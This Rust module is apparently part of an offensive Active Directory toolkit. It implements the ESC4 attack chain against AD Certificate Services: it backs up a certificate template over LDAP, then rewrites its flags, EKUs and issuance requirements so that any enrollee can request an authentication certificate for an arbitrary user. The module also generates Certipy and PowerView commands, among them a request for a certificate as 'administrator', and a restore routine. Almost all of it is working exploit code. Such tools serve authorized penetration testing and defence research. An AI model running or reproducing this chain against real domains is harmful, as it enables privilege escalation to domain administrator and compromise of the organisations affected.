//! ESC4 — Vulnerable Certificate Template Access Control
//!
//! When an attacker has WriteProperty / WriteDacl / WriteOwner rights
//! on a certificate template object in AD, they can:
//!
//! 1. (Optional) Modify the DACL to grant themselves full control
//! 2. Save the original template configuration for later restoration
//! 3. Push an ESC1-vulnerable configuration to the template
//! 4. Request a certificate using the now-vulnerable template (ESC1 chain)
//! 5. Restore the original template configuration
//!
//! This module implements the full attack chain with proper LDAP writes
//! using the ldap3 crate's modify operations.
//!
//! Reference: SpecterOps "Certified Pre-Owned" — ESC4

use crate::error::{OverthroneError, Result};
use crate::proto::ldap::LdapSession;
use serde::{Deserialize, Serialize};
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
// Constants — Template attribute names and values
// ═══════════════════════════════════════════════════════════

/// Template attributes we need to read/write
const ATTR_CN: &str = "cn";
const ATTR_CERT_NAME_FLAG: &str = "msPKI-Certificate-Name-Flag";
const ATTR_ENROLLMENT_FLAG: &str = "msPKI-Enrollment-Flag";
const ATTR_PRIVATE_KEY_FLAG: &str = "msPKI-Private-Key-Flag";
const ATTR_EKU: &str = "pKIExtendedKeyUsage";
const ATTR_APP_POLICY: &str = "msPKI-Certificate-Application-Policy";
const ATTR_RA_SIGNATURE: &str = "msPKI-RA-Signature";
const ATTR_MINOR_REVISION: &str = "msPKI-Template-Minor-Revision";
const ATTR_SECURITY_DESC: &str = "nTSecurityDescriptor";

/// CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 1
const FLAG_ENROLLEE_SUPPLIES_SUBJECT: u32 = 0x00000001;

/// Client Authentication OID
const OID_CLIENT_AUTH: &str = "1.3.6.1.5.5.7.3.2";

/// Smart Card Logon OID (Microsoft)
const OID_SMARTCARD_LOGON: &str = "1.3.6.1.4.1.311.20.2.2";

/// PKINIT Client Authentication OID
const OID_PKINIT_AUTH: &str = "1.3.6.1.5.2.3.4";

/// All attributes we snapshot for backup
const BACKUP_ATTRS: &[&str] = &[
    ATTR_CN,
    ATTR_CERT_NAME_FLAG,
    ATTR_ENROLLMENT_FLAG,
    ATTR_PRIVATE_KEY_FLAG,
    ATTR_EKU,
    ATTR_APP_POLICY,
    ATTR_RA_SIGNATURE,
    ATTR_MINOR_REVISION,
    ATTR_SECURITY_DESC,
];

// ═══════════════════════════════════════════════════════════
// Template Backup — snapshot before modification
// ═══════════════════════════════════════════════════════════

/// Snapshot of original template values for restoration
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TemplateBackup {
    /// Template distinguished name
    pub dn: String,
    /// Template common name
    pub name: String,
    /// Original attribute values (attribute name → list of values)
    pub attributes: std::collections::HashMap<String, Vec<String>>,
    /// Timestamp when backup was taken
    pub timestamp: String,
}

impl TemplateBackup {
    /// Save backup to JSON file
    pub fn save_to_file(&self, path: &str) -> Result<()> {
        let json = serde_json::to_string_pretty(self)
            .map_err(|e| OverthroneError::Adcs(format!("Failed to serialize backup: {}", e)))?;
        std::fs::write(path, json)
            .map_err(|e| OverthroneError::Adcs(format!("Failed to write backup file: {}", e)))?;
        info!("Template backup saved to: {}", path);
        Ok(())
    }

    /// Load backup from JSON file
    pub fn load_from_file(path: &str) -> Result<Self> {
        let json = std::fs::read_to_string(path)
            .map_err(|e| OverthroneError::Adcs(format!("Failed to read backup file: {}", e)))?;
        serde_json::from_str(&json)
            .map_err(|e| OverthroneError::Adcs(format!("Failed to parse backup: {}", e)))
    }

    /// Get a single attribute value (first value)
    pub fn get_attr(&self, name: &str) -> Option<&str> {
        self.attributes
            .get(name)
            .and_then(|v| v.first())
            .map(|s| s.as_str())
    }

    /// Get all values for an attribute
    pub fn get_attr_values(&self, name: &str) -> &[String] {
        self.attributes
            .get(name)
            .map(|v| v.as_slice())
            .unwrap_or(&[])
    }
}

// ═══════════════════════════════════════════════════════════
// ESC4 Target
// ═══════════════════════════════════════════════════════════

/// Target for ESC4 template modification attack
pub struct Esc4Target {
    pub template_name: String,
    pub domain: String,
    pub current_user: String,
    /// Saved backup for restoration
    backup: Option<TemplateBackup>,
    /// The DN of the template once resolved
    template_dn: Option<String>,
}

impl Esc4Target {
    pub fn new(
        template_name: impl Into<String>,
        domain: impl Into<String>,
        current_user: impl Into<String>,
    ) -> Self {
        Self {
            template_name: template_name.into(),
            domain: domain.into(),
            current_user: current_user.into(),
            backup: None,
            template_dn: None,
        }
    }

    /// Get the backup (if execute() was called)
    pub fn backup(&self) -> Option<&TemplateBackup> {
        self.backup.as_ref()
    }

    // ─────────────────────────────────────────────────────────
    // Step 1: Resolve template DN
    // ─────────────────────────────────────────────────────────

    /// Resolve the template's distinguished name from LDAP
    async fn resolve_template_dn(
        &mut self,
        ldap: &mut LdapSession,
        base_dn: &str,
    ) -> Result<String> {
        if let Some(ref dn) = self.template_dn {
            return Ok(dn.clone());
        }

        let filter = format!(
            "(&(objectClass=pKICertificateTemplate)(cn={}))",
            ldap3_escape(&self.template_name)
        );
        let config_nc = format!("CN=Configuration,{}", base_dn);

        let entries = ldap
            .custom_search_with_base(&config_nc, &filter, &["distinguishedName"])
            .await?;

        if entries.is_empty() {
            return Err(OverthroneError::Ldap {
                target: self.template_name.clone(),
                reason: "Certificate template not found in LDAP".to_string(),
            });
        }

        let dn = entries[0].dn.clone();
        info!("Resolved template DN: {}", dn);
        self.template_dn = Some(dn.clone());
        Ok(dn)
    }

    // ─────────────────────────────────────────────────────────
    // Step 2: Snapshot original values
    // ─────────────────────────────────────────────────────────

    /// Read and save the current template configuration before modifying
    async fn snapshot_template(
        &mut self,
        ldap: &mut LdapSession,
        base_dn: &str,
    ) -> Result<TemplateBackup> {
        let dn = self.resolve_template_dn(ldap, base_dn).await?;

        info!(
            "Taking snapshot of template '{}' before modification",
            self.template_name
        );

        let filter = format!(
            "(&(objectClass=pKICertificateTemplate)(cn={}))",
            ldap3_escape(&self.template_name)
        );
        let config_nc = format!("CN=Configuration,{}", base_dn);

        let entries = ldap
            .custom_search_with_base(&config_nc, &filter, BACKUP_ATTRS)
            .await?;

        if entries.is_empty() {
            return Err(OverthroneError::Ldap {
                target: self.template_name.clone(),
                reason: "Template disappeared between resolve and snapshot".to_string(),
            });
        }

        let entry = &entries[0];
        let mut attributes = std::collections::HashMap::new();

        for attr_name in BACKUP_ATTRS {
            if let Some(values) = entry.attrs.get(*attr_name) {
                attributes.insert(attr_name.to_string(), values.clone());
            }
        }

        let backup = TemplateBackup {
            dn: dn.clone(),
            name: self.template_name.clone(),
            attributes,
            timestamp: chrono::Utc::now().to_rfc3339(),
        };

        // Auto-save to file
        let backup_path = format!("{}_backup.json", self.template_name);
        if let Err(e) = backup.save_to_file(&backup_path) {
            warn!("Could not save backup file: {} (continuing anyway)", e);
        }

        self.backup = Some(backup.clone());
        Ok(backup)
    }

    // ─────────────────────────────────────────────────────────
    // Step 3: Push ESC1-vulnerable configuration
    // ─────────────────────────────────────────────────────────

    /// Execute the ESC4 exploit — modify template to be vulnerable to ESC1.
    ///
    /// Requires the attacker to have WriteProperty over the template object.
    /// This method:
    /// 1. Resolves the template DN
    /// 2. Takes a backup snapshot (saved to `{template}_backup.json`)
    /// 3. Modifies the template to allow enrollee-supplied SAN
    /// 4. Bumps the minor revision so AD propagates the change
    ///
    /// After this, use the ADCS ESC1 flow to request a cert with arbitrary UPN.
    pub async fn execute(&mut self, ldap: &mut LdapSession, base_dn: &str) -> Result<()> {
        info!(
            "=== ESC4 Attack: Modifying template '{}' ===",
            self.template_name
        );

        // Snapshot first (creates backup file)
        let backup = self.snapshot_template(ldap, base_dn).await?;
        let dn = backup.dn.clone();

        // Get current minor revision to increment
        let current_minor: u32 = backup
            .get_attr(ATTR_MINOR_REVISION)
            .and_then(|v| v.parse().ok())
            .unwrap_or(0);
        let new_minor = current_minor + 1;

        info!(
            "Pushing ESC1-vulnerable configuration to '{}'",
            self.template_name
        );

        // ── Modification 1: Allow enrollee to supply subject ──
        // msPKI-Certificate-Name-Flag = 1 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
        let name_flag_val = FLAG_ENROLLEE_SUPPLIES_SUBJECT.to_string();
        ldap.modify_attribute(
            &dn,
            ATTR_CERT_NAME_FLAG,
            ModifyOp::Replace,
            &[&name_flag_val],
        )
        .await
        .map_err(|e| OverthroneError::Ldap {
            target: dn.clone(),
            reason: format!("Failed to set {}: {}", ATTR_CERT_NAME_FLAG, e),
        })?;
        debug!("Set {} = {}", ATTR_CERT_NAME_FLAG, name_flag_val);

        // ── Modification 2: Remove PEND_ALL_REQUESTS from enrollment flags ──
        // msPKI-Enrollment-Flag = 0 (no auto-enrollment, no pending)
        ldap.modify_attribute(&dn, ATTR_ENROLLMENT_FLAG, ModifyOp::Replace, &["0"])
            .await
            .map_err(|e| OverthroneError::Ldap {
                target: dn.clone(),
                reason: format!("Failed to set {}: {}", ATTR_ENROLLMENT_FLAG, e),
            })?;
        debug!("Set {} = 0", ATTR_ENROLLMENT_FLAG);

        // ── Modification 3: Set EKU to Client Authentication ──
        // pKIExtendedKeyUsage = {Client Auth, Smart Card Logon, PKINIT}
        ldap.modify_attribute(
            &dn,
            ATTR_EKU,
            ModifyOp::Replace,
            &[OID_CLIENT_AUTH, OID_SMARTCARD_LOGON, OID_PKINIT_AUTH],
        )
        .await
        .map_err(|e| OverthroneError::Ldap {
            target: dn.clone(),
            reason: format!("Failed to set {}: {}", ATTR_EKU, e),
        })?;
        debug!("Set {} = [ClientAuth, SmartCard, PKINIT]", ATTR_EKU);

        // ── Modification 4: Set application policy to match ──
        ldap.modify_attribute(
            &dn,
            ATTR_APP_POLICY,
            ModifyOp::Replace,
            &[OID_CLIENT_AUTH, OID_SMARTCARD_LOGON, OID_PKINIT_AUTH],
        )
        .await
        .map_err(|e| OverthroneError::Ldap {
            target: dn.clone(),
            reason: format!("Failed to set {}: {}", ATTR_APP_POLICY, e),
        })?;
        debug!("Set {} = [ClientAuth, SmartCard, PKINIT]", ATTR_APP_POLICY);

        // ── Modification 5: Remove issuance requirements ──
        // msPKI-RA-Signature = 0 (no authorized signatures required)
        ldap.modify_attribute(&dn, ATTR_RA_SIGNATURE, ModifyOp::Replace, &["0"])
            .await
            .map_err(|e| OverthroneError::Ldap {
                target: dn.clone(),
                reason: format!("Failed to set {}: {}", ATTR_RA_SIGNATURE, e),
            })?;
        debug!("Set {} = 0", ATTR_RA_SIGNATURE);

        // ── Modification 6: Bump minor revision ──
        // AD won't propagate template changes without incrementing this
        let revision_str = new_minor.to_string();
        ldap.modify_attribute(
            &dn,
            ATTR_MINOR_REVISION,
            ModifyOp::Replace,
            &[&revision_str],
        )
        .await
        .map_err(|e| OverthroneError::Ldap {
            target: dn.clone(),
            reason: format!("Failed to bump {}: {}", ATTR_MINOR_REVISION, e),
        })?;
        debug!("Bumped {} to {}", ATTR_MINOR_REVISION, new_minor);

        info!(
            "✓ Template '{}' is now vulnerable to ESC1!",
            self.template_name
        );
        info!("  Backup saved to: {}_backup.json", self.template_name);
        info!(
            "  Next: Use ESC1 attack with template '{}' and target UPN",
            self.template_name
        );

        Ok(())
    }

    // ─────────────────────────────────────────────────────────
    // Step 4: Restore original configuration
    // ─────────────────────────────────────────────────────────

    /// Restore the template to its original configuration from backup.
    ///
    /// Can restore from:
    /// - In-memory backup (if `execute()` was called in this session)
    /// - A backup file path
    pub async fn restore(
        &mut self,
        ldap: &mut LdapSession,
        backup_path: Option<&str>,
    ) -> Result<()> {
        let backup = if let Some(path) = backup_path {
            TemplateBackup::load_from_file(path)?
        } else if let Some(ref b) = self.backup {
            b.clone()
        } else {
            // Try default path
            let default_path = format!("{}_backup.json", self.template_name);
            TemplateBackup::load_from_file(&default_path)?
        };

        info!(
            "Restoring template '{}' from backup (taken {})",
            backup.name, backup.timestamp
        );

        let dn = &backup.dn;

        // Restore each attribute
        let restore_attrs = [
            ATTR_CERT_NAME_FLAG,
            ATTR_ENROLLMENT_FLAG,
            ATTR_PRIVATE_KEY_FLAG,
            ATTR_EKU,
            ATTR_APP_POLICY,
            ATTR_RA_SIGNATURE,
        ];

        for attr_name in &restore_attrs {
            let values = backup.get_attr_values(attr_name);
            if values.is_empty() {
                // Attribute didn't exist originally — delete it
                debug!("Deleting {} (was not present originally)", attr_name);
                ldap.modify_attribute(dn, attr_name, ModifyOp::Delete, &[])
                    .await
                    .map_err(|e| OverthroneError::Ldap {
                        target: dn.clone(),
                        reason: format!("Failed to delete {}: {}", attr_name, e),
                    })?;
            } else {
                let value_refs: Vec<&str> = values.iter().map(|s| s.as_str()).collect();
                debug!("Restoring {} = {:?}", attr_name, value_refs);
                ldap.modify_attribute(dn, attr_name, ModifyOp::Replace, &value_refs)
                    .await
                    .map_err(|e| OverthroneError::Ldap {
                        target: dn.clone(),
                        reason: format!("Failed to restore {}: {}", attr_name, e),
                    })?;
            }
        }

        // Bump minor revision again so restore propagates
        let current_minor: u32 = backup
            .get_attr(ATTR_MINOR_REVISION)
            .and_then(|v| v.parse().ok())
            .unwrap_or(0);
        let bump = (current_minor + 2).to_string();
        ldap.modify_attribute(dn, ATTR_MINOR_REVISION, ModifyOp::Replace, &[&bump])
            .await
            .map_err(|e| OverthroneError::Ldap {
                target: dn.clone(),
                reason: format!("Failed to bump revision: {}", e),
            })?;

        info!(
            "✓ Template '{}' restored to original configuration",
            backup.name
        );
        Ok(())
    }

    // ─────────────────────────────────────────────────────────
    // Operator command generation (fallback)
    // ─────────────────────────────────────────────────────────

    /// Generate exploit commands for manual execution (Certipy / PowerView)
    ///
    /// Use this when LDAP write access is not available or as a reference.
    pub fn generate_exploit_commands(&self) -> Result<String> {
        info!(
            "Generating ESC4 exploit commands for template: {}",
            self.template_name
        );

        let certipy_cmd = format!(
            "certipy template -u '{}@{}' -p 'PASSWORD' -template '{}' -save-old",
            self.current_user, self.domain, self.template_name
        );

        let certipy_request = format!(
            "certipy req -u '{}@{}' -p 'PASSWORD' -ca 'CA-NAME' -template '{}' -upn 'administrator@{}' -dc-ip DC_IP",
            self.current_user, self.domain, self.template_name, self.domain
        );

        let powerview_cmds = format!(
            "# Step 1: Grant WriteProperty (if you have WriteDacl)\n\
             Add-DomainObjectAcl -TargetIdentity '{}' -PrincipalIdentity '{}' \\\n\
               -Rights WriteProperty -Verbose\n\n\
             # Step 2: Enable enrollee-supplied subject\n\
             Set-DomainObject -Identity '{}' -Set @{{'msPKI-Certificate-Name-Flag'=1}} -Verbose\n\n\
             # Step 3: Remove manager approval requirement\n\
             Set-DomainObject -Identity '{}' -Set @{{'msPKI-Enrollment-Flag'=0}} -Verbose\n\n\
             # Step 4: Set Client Auth EKU\n\
             Set-DomainObject -Identity '{}' -Set @{{'pKIExtendedKeyUsage'='1.3.6.1.5.5.7.3.2'}} -Verbose\n\n\
             # Step 5: Remove issuance requirements\n\
             Set-DomainObject -Identity '{}' -Set @{{'msPKI-RA-Signature'=0}} -Verbose",
            self.template_name,
            self.current_user,
            self.template_name,
            self.template_name,
            self.template_name,
            self.template_name,
        );

        let instructions = format!(
            "╔═══════════════════════════════════════════════╗\n\
             ║          ESC4 — Template Modification          ║\n\
             ╚═══════════════════════════════════════════════╝\n\n\
             Target Template: {}\n\
             Domain: {}\n\
             Attacker: {}\n\n\
             ── Certipy (Recommended) ──────────────────────\n\
             # Modify template:\n\
             {}\n\n\
             # Request cert as admin:\n\
             {}\n\n\
             ── PowerView ──────────────────────────────────\n\
             {}\n",
            self.template_name,
            self.domain,
            self.current_user,
            certipy_cmd,
            certipy_request,
            powerview_cmds
        );

        Ok(instructions)
    }

    /// Generate restore commands for manual execution
    pub fn generate_restore_commands(&self) -> Result<String> {
        let certipy_restore = format!(
            "certipy template -u '{}@{}' -p 'PASSWORD' -template '{}' \\\n\
               -configuration '{}_old.json'",
            self.current_user, self.domain, self.template_name, self.template_name
        );

        Ok(format!(
            "╔═══════════════════════════════════════════════╗\n\
             ║          ESC4 — Template Restoration           ║\n\
             ╚═══════════════════════════════════════════════╝\n\n\
             [Certipy]\n\
             {}\n\n\
             [Overthrone]\n\
             Backup file: {}_backup.json\n\
             Use Esc4Target::restore() with the backup file.\n",
            certipy_restore, self.template_name
        ))
    }
}

// ═══════════════════════════════════════════════════════════
// LDAP Modify Operation Enum
// ═══════════════════════════════════════════════════════════

/// LDAP modify operation type.
///
/// Maps to ldap3::Mod variants. This enum exists so that
/// esc4.rs doesn't need to import ldap3 directly — the
/// LdapSession translates these.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ModifyOp {
    /// Replace all values of the attribute
    Replace,
    /// Add values to the attribute
    Add,
    /// Delete values from the attribute (empty = delete attribute)
    Delete,
}

// ═══════════════════════════════════════════════════════════
// Helper — LDAP filter escaping
// ═══════════════════════════════════════════════════════════

/// Escape special characters in LDAP filter values per RFC 4515
fn ldap3_escape(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for c in input.chars() {
        match c {
            '\\' => out.push_str("\\5c"),
            '*' => out.push_str("\\2a"),
            '(' => out.push_str("\\28"),
            ')' => out.push_str("\\29"),
            '\0' => out.push_str("\\00"),
            _ => out.push(c),
        }
    }
    out
}

// ═══════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_esc4_target_creation() {
        let target = Esc4Target::new("VulnTemplate", "corp.local", "jdoe");
        assert_eq!(target.template_name, "VulnTemplate");
        assert_eq!(target.domain, "corp.local");
        assert_eq!(target.current_user, "jdoe");
        assert!(target.backup.is_none());
    }

    #[test]
    fn test_generate_exploit_commands() {
        let target = Esc4Target::new("ESC4Template", "corp.local", "attacker");
        let cmds = target.generate_exploit_commands().unwrap();
        assert!(cmds.contains("ESC4Template"));
        assert!(cmds.contains("certipy template"));
        assert!(cmds.contains("msPKI-Certificate-Name-Flag"));
        assert!(cmds.contains("attacker"));
    }

    #[test]
    fn test_generate_restore_commands() {
        let target = Esc4Target::new("ESC4Template", "corp.local", "attacker");
        let cmds = target.generate_restore_commands().unwrap();
        assert!(cmds.contains("ESC4Template_old.json"));
        assert!(cmds.contains("Restore"));
    }

    #[test]
    fn test_ldap_escape() {
        assert_eq!(ldap3_escape("normal"), "normal");
        assert_eq!(ldap3_escape("has*wild"), "has\\2awild");
        assert_eq!(ldap3_escape("(parens)"), "\\28parens\\29");
        assert_eq!(ldap3_escape("back\\slash"), "back\\5cslash");
    }

    #[test]
    fn test_template_backup_serialization() {
        let mut attrs = std::collections::HashMap::new();
        attrs.insert(
            "msPKI-Certificate-Name-Flag".to_string(),
            vec!["0".to_string()],
        );
        attrs.insert(
            "pKIExtendedKeyUsage".to_string(),
            vec!["1.3.6.1.5.5.7.3.1".to_string()],
        );

        let backup = TemplateBackup {
            dn: "CN=Test,CN=Templates".to_string(),
            name: "Test".to_string(),
            attributes: attrs,
            timestamp: "2026-02-24T00:00:00Z".to_string(),
        };

        let json = serde_json::to_string(&backup).unwrap();
        let restored: TemplateBackup = serde_json::from_str(&json).unwrap();
        assert_eq!(restored.name, "Test");
        assert_eq!(restored.get_attr("msPKI-Certificate-Name-Flag"), Some("0"));
    }

    #[test]
    fn test_modify_op_variants() {
        assert_ne!(ModifyOp::Replace, ModifyOp::Add);
        assert_ne!(ModifyOp::Add, ModifyOp::Delete);
    }
}
